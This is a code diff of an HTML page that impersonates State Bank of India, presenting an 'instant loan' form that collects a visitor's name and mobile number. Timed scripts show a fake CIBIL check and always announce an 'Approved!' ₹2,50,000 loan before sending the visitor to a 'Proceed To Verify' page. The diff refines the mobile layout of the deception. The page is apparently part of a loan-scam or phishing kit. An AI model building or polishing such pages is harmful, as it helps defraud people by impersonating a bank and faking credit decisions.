@@ -2,121 +2,149 @@
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBI Online - Official Loan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBI Online - Application</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family: sans-serif; }
-        body { background-color:#e9eef2; color: #333; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, sans-serif; }
+        body { background-color:#f2f5f8; color: #333; }
 
-        /* SBI Official Header Look */
-        .header { background-color: white; padding: 10px 0; text-align: center; border-bottom: 1px solid #ddd; }
-        .logo { height: 45px; margin-bottom: 10px; }
-        .blue-bar { background-color: #003366; height: 40px; width: 100%; display: flex; align-items: center; padding: 0 15px; position: relative; }
-        .menu-icon { color: white; font-size: 20px; }
+        /* Full Width Logo (Already contains Header/Blue Bar) */
+        .full-logo-header { width: 100%; display: block; border-bottom: 1px solid #ddd; }
 
-        /* Main Container */
-        .container { max-width: 420px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .title { color: #20639B; font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 25px; text-transform: uppercase; }
+        /* Mobile Container */
+        .main-container { padding: 15px; margin-top: 5px; }
+        .apply-card { 
+            background: white; 
+            border-radius: 6px; 
+            border: 1px solid #d1d9e0; 
+            box-shadow: 0 3px 10px rgba(0,0,0,0.06);
+            overflow: hidden;
+        }
+        .card-title { 
+            background-color: #f8f9fa; 
+            padding: 12px; 
+            color: #20639B; 
+            font-size: 16px; 
+            font-weight: 700; 
+            text-align: center; 
+            border-bottom: 1px solid #eee;
+            text-transform: uppercase;
+        }
 
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { font-size: 12px; font-weight: bold; color: #666; display: block; margin-bottom: 8px; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; outline: none; font-size: 15px; background: #f9f9f9; }
-
-        /* Patla Official Button (Gadha Blue) */
-        .sky-btn { width: 100%; padding: 14px; background-color: #007bb5; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-
-        /* Custom Official Alert Modal (Instead of Browser Alert) */
-        .custom-alert-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); justify-content:center; align-items:center; z-index: 20000; }
-        .custom-alert-box { background:white; width:85%; max-width:320px; border-radius:12px; overflow:hidden; text-align:center; animation: popUp 0.3s ease; }
-        .alert-body { padding: 25px 20px; font-size: 15px; color: #444; line-height: 1.5; }
-        .alert-btn { width:100%; padding: 15px; border:none; background:#fff; border-top:1px solid #eee; color:#007bb5; font-size:16px; font-weight:bold; cursor:pointer; }
-
-        /* Main Popup (Processing & Result) */
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; z-index: 10000; }
-        .modal-box { background: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 350px; text-align: center; position: relative; }
+        .form-content { padding: 20px 18px; }
+        .input-group { margin-bottom: 18px; }
+        label { font-size: 11px; font-weight: 700; color: #555; display: block; margin-bottom: 6px; text-transform: uppercase; }
         
-        .spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #007bb5; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+        input { 
+            width: 100%; padding: 12px; border: 1.5px solid #cbd5e0; border-radius: 4px; 
+            font-size: 16px; outline: none; background: #fff; appearance: none;
+        }
+        input:focus { border-color: #007bb5; }
+
+        /* Sleek Official Button */
+        .btn-apply { 
+            width: 100%; padding: 14px; background-color: #007bb5; color: white; 
+            border: none; border-radius: 4px; font-size: 15px; font-weight: 700; 
+            cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px;
+        }
+        .btn-apply:active { background-color: #005f8d; transform: scale(0.98); }
+
+        /* Footer Image */
+        .footer-banner { width: 100%; padding: 10px 15px 30px; }
+        .footer-banner img { width: 100%; border-radius: 6px; border: 1px solid #ddd; }
+
+        /* Custom Alert Like Screenshot */
+        .alert-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); justify-content:center; align-items:center; z-index: 10000; padding: 30px; }
+        .alert-box { background:white; width:100%; max-width:300px; border-radius:15px; overflow:hidden; text-align:center; animation: pop 0.2s ease-out; }
+        .alert-text { padding: 25px 20px; font-size: 15px; color: #333; line-height: 1.4; }
+        .alert-btn { width:100%; padding: 14px; border:none; background:#fff; border-top:1px solid #eee; color:#007bb5; font-size:17px; font-weight:700; }
+
+        /* Processing Popup */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
+        .modal-box { background: white; padding: 30px; border-radius: 12px; width: 100%; max-width: 340px; text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #007bb5; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .loan-amount { font-size: 32px; font-weight: bold; color: #007bb5; margin: 15px 0; background: #eef7fb; padding: 15px; border-radius: 8px; border: 1px dashed #007bb5; }
-        
-        @keyframes popUp { from { transform:scale(0.8); opacity:0; } to { transform:scale(1); opacity:1; } }
+        .loan-val { font-size: 32px; font-weight: 800; color: #007bb5; margin: 15px 0; background: #f0f7ff; padding: 12px; border-radius: 8px; border: 2px dashed #007bb5; }
+
+        @keyframes pop { from { transform:scale(0.8); opacity:0; } to { transform:scale(1); opacity:1; } }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="logo" alt="SBI">
-        <div class="blue-bar">
-            <span class="menu-icon">☰</span>
-        </div>
-    </div>
+    <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="full-logo-header" alt="SBI Header">
 
-    <div class="container">
-        <h2 class="title">Apply For Instant Loan</h2>
-        <div class="form-group">
-            <label>FULL NAME*</label>
-            <input type="text" id="custName" placeholder="Enter Full Name">
-        </div>
-        <div class="form-group">
-            <label>MOBILE NUMBER*</label>
-            <input type="number" id="custMobile" placeholder="10 Digit Number" oninput="if(this.value.length > 10) this.value = this.value.slice(0, 10);">
-        </div>
-        <button class="sky-btn" onclick="startOfficialProcess()">Check My Offer</button>
-    </div>
-
-    <div class="custom-alert-overlay" id="errorAlert">
-        <div class="custom-alert-box">
-            <div class="alert-body">Please enter a valid Name and 10-digit Mobile Number.</div>
-            <button class="alert-btn" onclick="closeAlert()">OK</button>
-        </div>
-    </div>
-
-    <div class="modal-overlay" id="mainPopup">
-        <div class="modal-box">
-            <div id="loading">
-                <div class="spinner"></div>
-                <p style="margin-top:15px; color:#666;" id="statusMsg">Verifying Account...</p>
+    <div class="main-container">
+        <div class="apply-card">
+            <div class="card-title">Apply For Instant Loan</div>
+            <div class="form-content">
+                <div class="input-group">
+                    <label>Full Name*</label>
+                    <input type="text" id="nameInp" placeholder="Enter Full Name">
+                </div>
+                <div class="input-group">
+                    <label>Mobile Number*</label>
+                    <input type="number" id="mobInp" placeholder="10 Digit Number" 
+                           oninput="if(this.value.length > 10) this.value = this.value.slice(0, 10);">
+                </div>
+                <button class="btn-apply" onclick="processData()">Check Eligibility</button>
             </div>
-            <div id="result" style="display:none;">
-                <h2 style="color:#2ecc71;">Approved!</h2>
-                <p style="margin:10px 0;">Congratulations <strong id="resName"></strong>!</p>
-                <div class="loan-amount">₹2,50,000</div>
-                <button class="sky-btn" onclick="window.location.href='mypages.html'">Proceed To Verify</button>
+        </div>
+    </div>
+
+    <div class="footer-banner">
+        <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="SBI Security">
+    </div>
+
+    <div class="alert-overlay" id="err">
+        <div class="alert-box">
+            <div class="alert-text">Please enter a valid Name and 10-digit Mobile Number.</div>
+            <button class="alert-btn" onclick="document.getElementById('err').style.display='none'">OK</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="pop">
+        <div class="modal-box">
+            <div id="loaderArea">
+                <div class="spinner"></div>
+                <p style="color:#666; font-size: 14px;" id="statusMsg">Verifying Application...</p>
+            </div>
+            <div id="resultArea" style="display:none;">
+                <h2 style="color:#2ecc71; font-size: 22px;">Approved!</h2>
+                <p style="margin:10px 0; color: #444;">Congratulations <strong id="nmDisplay"></strong>!</p>
+                <div class="loan-val">₹2,50,000</div>
+                <button class="btn-apply" onclick="window.location.href='mypages.html'">Proceed To Verify</button>
             </div>
         </div>
     </div>
 
     <script>
-        function showAlert() { document.getElementById('errorAlert').style.display = 'flex'; }
-        function closeAlert() { document.getElementById('errorAlert').style.display = 'none'; }
-
-        function startOfficialProcess() {
-            const name = document.getElementById('custName').value;
-            const mobile = document.getElementById('custMobile').value;
-
-            if (name.trim() === "" || mobile.length !== 10) {
-                showAlert(); // browser alert ki jagah custom alert
-                return;
+        function processData() {
+            const n = document.getElementById('nameInp').value;
+            const m = document.getElementById('mobInp').value;
+            if(n.trim().length < 3 || m.length !== 10) { 
+                document.getElementById('err').style.display='flex'; 
+                return; 
             }
 
-            document.getElementById('mainPopup').style.display = 'flex';
-            const status = document.getElementById('statusMsg');
+            document.getElementById('pop').style.display='flex';
+            const s = document.getElementById('statusMsg');
 
-            setTimeout(() => { status.innerText = "Checking CIBIL Score..."; }, 3000);
-            setTimeout(() => { status.innerText = "Generating Best Offer..."; }, 7000);
+            setTimeout(() => s.innerText = "Checking CIBIL Records...", 3000);
+            setTimeout(() => s.innerText = "Generating Best Offer...", 7000);
 
             setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('result').style.display = 'block';
-                document.getElementById('resName').innerText = name;
+                document.getElementById('loaderArea').style.display='none';
+                document.getElementById('resultArea').style.display='block';
+                document.getElementById('nmDisplay').innerText = n;
                 
+                // Blast Colorful Bubbles
                 confetti({
-                    particleCount: 150,
-                    spread: 70,
+                    particleCount: 120,
+                    spread: 60,
                     origin: { y: 0.6 },
-                    colors: ['#007bb5', '#2ecc71', '#ffeb3b']
+                    colors: ['#007bb5', '#2ecc71', '#ffeb3b', '#ffffff']
                 });
             }, 10000);
         }
